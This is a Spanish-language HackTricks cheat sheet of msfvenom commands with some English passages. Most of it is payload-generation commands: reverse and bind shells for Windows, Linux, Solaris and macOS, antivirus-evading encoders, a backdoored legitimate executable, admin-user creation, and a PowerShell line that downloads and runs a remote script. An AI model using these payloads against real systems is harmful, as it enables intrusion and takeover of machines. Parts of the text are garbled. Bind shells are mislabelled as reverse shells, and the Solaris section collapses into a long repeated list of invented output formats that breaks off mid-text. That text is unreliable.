# MSFVenom - Hoja de trucos

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof es el hogar de todas las recompensas por errores de criptografía.**

**Obtén recompensas sin demoras**\
Las recompensas de HackenProof se lanzan solo cuando sus clientes depositan el presupuesto de recompensa. Obtendrás la recompensa después de que se verifique el error.

**Obtén experiencia en pentesting web3**\
¡Los protocolos de blockchain y los contratos inteligentes son el nuevo Internet! Domina la seguridad web3 en sus días de crecimiento.

**Conviértete en la leyenda del hacker web3**\
Gana puntos de reputación con cada error verificado y conquista la cima de la clasificación semanal.

[**Regístrate en HackenProof**](https://hackenproof.com/register) y comienza a ganar con tus hacks!

{% embed url="https://hackenproof.com/register" %}

***

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

También se puede usar `-a` para especificar la arquitectura o `--platform`
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## Parámetros comunes al crear un shellcode

Al crear un shellcode, hay varios parámetros comunes que se pueden utilizar para personalizar y adaptar el código según las necesidades específicas. A continuación se presentan algunos de los parámetros más utilizados:

- **`-p`** o **`--payload`**: especifica el payload que se utilizará en el shellcode. Esto determina la funcionalidad del shellcode, como la ejecución de comandos remotos o la obtención de una shell interactiva.

- **`-f`** o **`--format`**: especifica el formato de salida del shellcode. Puede ser binario, C, Ruby, Python, entre otros.

- **`-e`** o **`--encoder`**: especifica el encoder que se utilizará para ofuscar el shellcode. Esto puede ayudar a evadir la detección de antivirus y otras medidas de seguridad.

- **`-b`** o **`--bad-chars`**: especifica los caracteres que deben evitarse en el shellcode. Esto es útil cuando se trabaja con aplicaciones que filtran ciertos caracteres.

- **`-i`** o **`--iterations`**: especifica el número de iteraciones que se utilizarán para codificar el shellcode. Cuantas más iteraciones, más difícil será detectar el shellcode.

- **`-a`** o **`--arch`**: especifica la arquitectura de destino para el shellcode. Puede ser x86, x64, ARM, MIPS, entre otros.

- **`-o`** o **`--out`**: especifica el nombre del archivo de salida donde se guardará el shellcode.

Estos son solo algunos de los parámetros más comunes que se pueden utilizar al crear un shellcode. Es importante tener en cuenta que los parámetros pueden variar según la herramienta o el framework utilizado.
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
A reverse shell is a type of shell in which the target machine initiates the connection to the attacker's machine. This allows the attacker to gain remote access to the target machine. In this section, we will use the `msfvenom` tool to generate a reverse shell payload for Windows.

To generate a reverse shell payload, we need to specify the IP address and port number of the attacker's machine. The following command will generate a reverse shell payload using `msfvenom`:

```plaintext
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f exe > shell.exe
```

Replace `<attacker IP>` with the IP address of the attacker's machine and `<attacker port>` with the port number on which the attacker is listening for incoming connections. The generated payload will be saved as `shell.exe`.

Once the payload is generated, it can be executed on the target machine to establish a reverse shell connection to the attacker's machine.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
A bind shell is a type of shell that listens for incoming connections on a specific port. Once a connection is established, the bind shell provides a command prompt interface to interact with the target system. This allows an attacker to gain remote access and control over the compromised system.

To create a bind shell payload using `msfvenom`, you can use the following command:

```plaintext
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<port> -f <format> -o <output file>
```

- `<payload>`: The payload to use, such as `windows/meterpreter/reverse_tcp` or `linux/x86/shell/bind_tcp`.
- `<attacker IP>`: The IP address of the attacker machine.
- `<port>`: The port number to listen on.
- `<format>`: The output format, such as `exe`, `elf`, or `raw`.
- `<output file>`: The name of the output file to save the payload.

For example, to create a bind shell payload for a Windows system, listening on port 4444, and save it as `shell.exe`, you can use the following command:

```plaintext
msfvenom -p windows/meterpreter/bind_tcp LHOST=<attacker IP> LPORT=4444 -f exe -o shell.exe
```

Once the payload is generated, you can transfer it to the target system and execute it to establish a bind shell connection.
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### Crear Usuario

To create a user, you can use the `msfvenom` tool, which is part of the Metasploit Framework. `msfvenom` allows you to generate various types of payloads, including shellcode, which can be used to create a user on a target system.

To create a user, you need to generate a payload that will execute the necessary commands to create the user account. Here is an example of how to do this using `msfvenom`:

```plaintext
msfvenom -p windows/exec CMD="net user hacker password123 /add" -f exe > create_user.exe
```

In this example, we are generating an executable payload (`-f exe`) that will execute the `net user` command to create a user with the username "hacker" and the password "password123". The payload is saved to a file called `create_user.exe`.

Once you have generated the payload, you can deliver it to the target system using various methods, such as social engineering or exploiting vulnerabilities. Once the payload is executed on the target system, it will create the user account as specified.

It is important to note that creating a user account on a system without proper authorization is illegal and unethical. This information is provided for educational purposes only, and it is your responsibility to use this knowledge responsibly and within the bounds of the law.
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### Shell CMD

El shell CMD es una interfaz de línea de comandos utilizada en sistemas operativos Windows. Es una herramienta poderosa que permite a los usuarios ejecutar comandos y realizar diversas tareas en el sistema operativo. El shell CMD se puede utilizar para ejecutar programas, administrar archivos y directorios, configurar redes y realizar otras operaciones relacionadas con el sistema.

#### Generando una shell CMD con msfvenom

Msfvenom es una herramienta de Metasploit que se utiliza para generar payloads personalizados. Puede generar una shell CMD personalizada utilizando el siguiente comando:

```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP del atacante> LPORT=<Puerto del atacante> -f exe > shell.exe
```

Este comando generará un archivo ejecutable llamado "shell.exe" que contiene una shell CMD inversa. La opción `-p` especifica el payload que se utilizará, en este caso, "windows/shell/reverse_tcp" que establece una conexión TCP inversa. Las opciones `LHOST` y `LPORT` se utilizan para especificar la dirección IP y el puerto del atacante.

Una vez que se haya generado el archivo "shell.exe", puede ser ejecutado en el sistema objetivo para establecer una conexión inversa con el atacante a través de una shell CMD.

Es importante tener en cuenta que el uso de herramientas como msfvenom y la generación de shells CMD personalizadas solo debe realizarse con fines legales y éticos, como parte de pruebas de penetración autorizadas o actividades de investigación. El uso indebido de estas herramientas puede ser ilegal y está sujeto a consecuencias legales.
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Ejecutar Comando**

The `msfvenom` tool in Metasploit Framework allows us to generate payloads that can be used to execute commands on a target system. This can be useful during a penetration test to gain remote access and control over the target.

To generate a payload that executes a command, we can use the following command:

```
msfvenom -p cmd/unix/reverse_netcat LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
```

Replace `<attacker IP>` with the IP address of the machine running the listener, and `<attacker port>` with the port number on which the listener is running.

The `<format>` parameter specifies the format of the payload, such as `raw`, `elf`, `exe`, `psh`, etc.

The `<output file>` parameter specifies the file name and location where the payload will be saved.

Once the payload is generated, it can be delivered to the target system using various methods, such as social engineering, email attachments, or exploiting vulnerabilities.

When the payload is executed on the target system, it establishes a reverse connection to the attacker's machine, allowing the attacker to execute commands remotely.

It is important to note that the use of such payloads for unauthorized access is illegal and unethical. These techniques should only be used in controlled environments with proper authorization.
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Codificador

El codificador es una herramienta utilizada en el hacking para modificar el código fuente de un programa o script con el fin de ocultar su verdadera funcionalidad. Los codificadores se utilizan comúnmente para evadir la detección de antivirus y otras medidas de seguridad.

En el contexto de Metasploit, el codificador msfvenom es una herramienta poderosa que se utiliza para generar payloads (cargas útiles) codificadas. Estas cargas útiles codificadas pueden ayudar a evadir la detección de antivirus y firewalls, lo que permite a los hackers obtener acceso no autorizado a sistemas y redes.

Msfvenom ofrece una amplia gama de opciones y parámetros para personalizar las cargas útiles codificadas. Puede especificar el tipo de payload, la arquitectura del sistema objetivo, el formato de salida y el método de codificación. Algunos de los métodos de codificación disponibles incluyen `shikata_ga_nai`, `xor`, `sub`, `b64`, entre otros.

El uso de msfvenom requiere un conocimiento sólido de la codificación y de las técnicas de evasión de seguridad. Es importante tener en cuenta que el uso de herramientas de codificación para fines maliciosos es ilegal y puede tener graves consecuencias legales.
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### Incrustado dentro de un ejecutable

El método de incrustar un payload dentro de un ejecutable es una técnica comúnmente utilizada en hacking para lograr la ejecución remota de comandos en un sistema objetivo. Esta técnica se basa en la capacidad de inyectar código malicioso en un archivo ejecutable existente sin alterar su funcionalidad original.

Una herramienta popular utilizada para llevar a cabo esta técnica es `msfvenom`, que es parte del marco de trabajo Metasploit. `msfvenom` permite generar payloads personalizados y embeberlos dentro de ejecutables legítimos. Esto se logra mediante la manipulación del archivo ejecutable original y la inserción del código malicioso en una sección específica del archivo.

Una vez que el archivo ejecutable modificado se ejecuta en el sistema objetivo, el payload incrustado se activa y permite al atacante tomar el control remoto del sistema. Esto puede incluir la ejecución de comandos, la extracción de información confidencial o la instalación de malware adicional.

Es importante tener en cuenta que el uso de esta técnica puede ser ilegal y está sujeto a las leyes y regulaciones de cada jurisdicción. Se recomienda utilizar estas técnicas solo con fines educativos o en entornos controlados y autorizados, como parte de pruebas de penetración éticas.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
A reverse shell is a type of payload that allows an attacker to establish a connection from the target machine to their own machine. This enables the attacker to gain remote access to the target machine and execute commands.

To create a reverse shell payload using `msfvenom`, you can use the following command:

```bash
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
```

- `<payload>`: The payload to use. This can be any of the available payloads in Metasploit Framework.
- `<attacker IP>`: The IP address of the attacker's machine.
- `<attacker port>`: The port on the attacker's machine to listen for incoming connections.
- `<format>`: The format of the output file. This can be any of the supported formats, such as `elf`, `exe`, `raw`, etc.
- `<output file>`: The name of the output file to save the payload.

For example, to create a reverse shell payload using the `linux/x86/shell_reverse_tcp` payload, with the attacker's IP address set to `192.168.0.100` and the port set to `4444`, and save it as `reverse_shell.elf`, you can use the following command:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f elf -o reverse_shell.elf
```

This will generate a Linux ELF executable file (`reverse_shell.elf`) that, when executed on the target machine, will establish a reverse shell connection to the attacker's machine.
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
Un *bind shell* es un tipo de shell inversa que se establece en el servidor objetivo y espera a que un cliente se conecte a él. Una vez que se establece la conexión, el cliente puede enviar comandos al servidor y recibir las respuestas correspondientes. Esto permite al atacante obtener acceso remoto al sistema objetivo y ejecutar comandos en él.

El comando `msfvenom` de Metasploit Framework se puede utilizar para generar un payload de bind shell. El payload se puede personalizar según las necesidades del atacante, como el sistema operativo objetivo, la arquitectura y el puerto de escucha.

A continuación se muestra un ejemplo de cómo generar un payload de bind shell utilizando `msfvenom`:

```plaintext
msfvenom -p <payload> LHOST=<IP del atacante> LPORT=<puerto de escucha> -f <formato> -o <archivo de salida>
```

- `<payload>`: el payload específico que se utilizará, como `windows/shell_bind_tcp` para sistemas Windows o `linux/x86/shell_bind_tcp` para sistemas Linux.
- `<IP del atacante>`: la dirección IP del atacante donde se enviarán las conexiones entrantes.
- `<puerto de escucha>`: el puerto en el que el bind shell estará escuchando las conexiones entrantes.
- `<formato>`: el formato de salida deseado, como `exe`, `elf` o `raw`.
- `<archivo de salida>`: el nombre y la ubicación del archivo de salida que contendrá el payload generado.

Una vez que se haya generado el payload, se puede utilizar en una variedad de herramientas y técnicas de hacking para obtener acceso remoto al sistema objetivo. Es importante tener en cuenta que el uso de bind shells en sistemas ajenos sin permiso es ilegal y puede tener consecuencias legales graves.
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)

SunOS, también conocido como Solaris, es un sistema operativo basado en Unix desarrollado por Sun Microsystems. Es ampliamente utilizado en entornos empresariales debido a su estabilidad y seguridad.

#### Generando una shell inversa en SunOS

Para generar una shell inversa en SunOS, podemos utilizar la herramienta `msfvenom` de Metasploit Framework. `msfvenom` nos permite generar payloads personalizados para explotar vulnerabilidades en sistemas objetivo.

El siguiente comando generará un payload de shell inversa en SunOS utilizando `msfvenom`:

```plaintext
msfvenom -p cmd/unix/reverse_netcat LHOST=<IP_DEL_ATACANTE> LPORT=<PUERTO_DEL_ATACANTE> -f <FORMATO> > shell.<EXTENSION>
```

Reemplaza `<IP_DEL_ATACANTE>` con la dirección IP del atacante y `<PUERTO_DEL_ATACANTE>` con el puerto que deseas utilizar para la conexión inversa. `<FORMATO>` puede ser `elf`, `elf-so`, `elf-bundle`, `elf-dynstr`, `elf-plt`, `elf-rel`, `elf-symtab`, `elf-hash`, `elf-dynsym`, `elf-dynstr`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `elf-dynsymtab`, `elf-dynhash`, `elf-dynplt`, `elf-dynrel`, `
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
### **Shell inversa:**

Una shell inversa es una técnica utilizada en hacking para establecer una conexión desde la máquina objetivo a la máquina del atacante. Esto permite al atacante ejecutar comandos en la máquina objetivo de forma remota.

En Metasploit Framework, podemos generar una shell inversa para sistemas MAC utilizando la herramienta `msfvenom`. `Msfvenom` es una herramienta de generación de payloads que nos permite crear payloads personalizados para diferentes sistemas operativos y arquitecturas.

Para generar una shell inversa para sistemas MAC, podemos utilizar el siguiente comando:

```plaintext
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP_DEL_ATACANTE> LPORT=<PUERTO> -f <FORMATO> > shell.macho
```

Reemplaza `<IP_DEL_ATACANTE>` con la dirección IP de la máquina del atacante y `<PUERTO>` con el número de puerto que deseas utilizar para la conexión. `<FORMATO>` se refiere al formato de salida del payload, como `macho`, `elf`, `exe`, etc.

Una vez que se genera el payload, puedes transferirlo a la máquina objetivo y ejecutarlo para establecer una conexión inversa con la máquina del atacante.
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
Un **Bind Shell** es un tipo de shell inversa que se establece en el servidor objetivo y espera a que un cliente se conecte a él. Una vez que se establece la conexión, el cliente puede enviar comandos al servidor y recibir las respuestas correspondientes. Esto permite al atacante obtener acceso remoto al sistema objetivo y ejecutar comandos en él.

El uso de un Bind Shell puede ser beneficioso en situaciones en las que el servidor objetivo tiene restricciones de salida de red, como un firewall o un enrutador que bloquea las conexiones salientes. Al establecer un Bind Shell en el servidor, el atacante puede sortear estas restricciones y obtener acceso al sistema.

Para crear un Bind Shell, se puede utilizar la herramienta `msfvenom` de Metasploit Framework. `msfvenom` permite generar payloads personalizados que se pueden utilizar en ataques de hacking. A continuación se muestra un ejemplo de cómo crear un Bind Shell utilizando `msfvenom`:

```plaintext
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe > bind_shell.exe
```

En este ejemplo, se está generando un payload de Bind Shell para Windows que escucha en el puerto 4444. El payload se guarda en un archivo ejecutable llamado `bind_shell.exe`.

Una vez que se haya generado el payload, se puede utilizar en combinación con otras herramientas de hacking, como Metasploit Framework, para llevar a cabo un ataque exitoso. Es importante tener en cuenta que el uso de Bind Shells y otras técnicas de hacking debe realizarse de manera ética y legal, con el consentimiento adecuado del propietario del sistema objetivo.
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
